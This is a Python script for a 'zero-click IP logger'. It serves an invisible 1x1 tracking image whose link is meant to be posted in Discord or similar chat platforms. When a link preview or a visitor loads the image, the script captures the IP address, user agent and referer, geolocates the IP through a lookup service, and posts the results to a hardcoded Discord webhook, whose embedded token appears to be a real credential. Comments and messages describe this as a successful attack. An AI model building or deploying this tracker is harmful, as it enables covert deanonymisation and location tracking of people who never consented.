from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import requests, json, base64

WEBHOOK_URL = "https://discord.com/api/webhooks/1437431909297950831/hOR6sC5C0jZqrc19t0udy6CD02ujqAOVlyNAg07omPr8m9jTDKg_OHmPkxsIDU1XI-bS"

# A simple 1x1 transparent PNG (invisible tracking pixel)
TRANSPARENT_PNG = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

class ZeroClickIPLogger(BaseHTTPRequestHandler):
    
    def do_GET(self):
        try:
            # Get client IP from various headers
            client_ip = (self.headers.get('X-Forwarded-For', '').split(',')[0] or 
                        self.headers.get('X-Real-IP') or 
                        self.headers.get('CF-Connecting-IP') or 
                        self.client_address[0])
            
            user_agent = self.headers.get('User-Agent', 'Unknown')
            referer = self.headers.get('Referer', 'No Referer')
            
            # Detect who's accessing
            is_discord = 'Discordbot' in user_agent
            is_telegram = 'TelegramBot' in user_agent
            is_slack = 'Slackbot' in user_agent
            is_twitter = 'Twitterbot' in user_agent
            
            platform = "Unknown"
            if is_discord: platform = "Discord"
            elif is_telegram: platform = "Telegram" 
            elif is_slack: platform = "Slack"
            elif is_twitter: platform = "Twitter"
            else: platform = "Direct Visit"
            
            # Get IP geolocation info
            ip_info = {}
            try:
                ip_info = requests.get(f'http://ip-api.com/json/{client_ip}').json()
            except:
                ip_info = {'country': 'Unknown', 'isp': 'Unknown', 'city': 'Unknown'}
            
            # Log to Discord webhook
            embed = {
                "username": "Zero-Click IP Logger",
                "embeds": [{
                    "title": "🚨 ZERO-CLICK IP CAPTURED",
                    "color": 0x00ff00,
                    "description": f"**Platform:** {platform}\n**Method:** Auto-preview",
                    "fields": [
                        {"name": "IP Address", "value": f"`{client_ip}`", "inline": True},
                        {"name": "Country", "value": ip_info.get('country', 'Unknown'), "inline": True},
                        {"name": "City", "value": ip_info.get('city', 'Unknown'), "inline": True},
                        {"name": "ISP", "value": ip_info.get('isp', 'Unknown'), "inline": True},
                        {"name": "User Agent", "value": f"```{user_agent[:400]}```", "inline": False},
                        {"name": "Referer", "value": f"`{referer}`", "inline": False}
                    ],
                    "footer": {"text": "Zero-Click Attack Successful"}
                }]
            }
            
            requests.post(WEBHOOK_URL, json=embed)
            
            # Serve the actual image that Discord will display
            self.send_response(200)
            self.send_header('Content-type', 'image/png')
            self.send_header('Cache-Control', 'public, max-age=3600')  # Cache for preview
            self.end_headers()
            self.wfile.write(TRANSPARENT_PNG)  # Serves the actual image
            
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(200)  # Still return success to avoid errors
            self.send_header('Content-type', 'image/png')
            self.end_headers()
            self.wfile.write(TRANSPARENT_PNG)

    def log_message(self, format, *args):
        pass  # Disable logging

def run_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), ZeroClickIPLogger)
    print(f"Zero-Click IP Logger running on port {port}")
    print("Send this link in Discord:")
    print(f"http://your-server.com:{port}/image.png")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
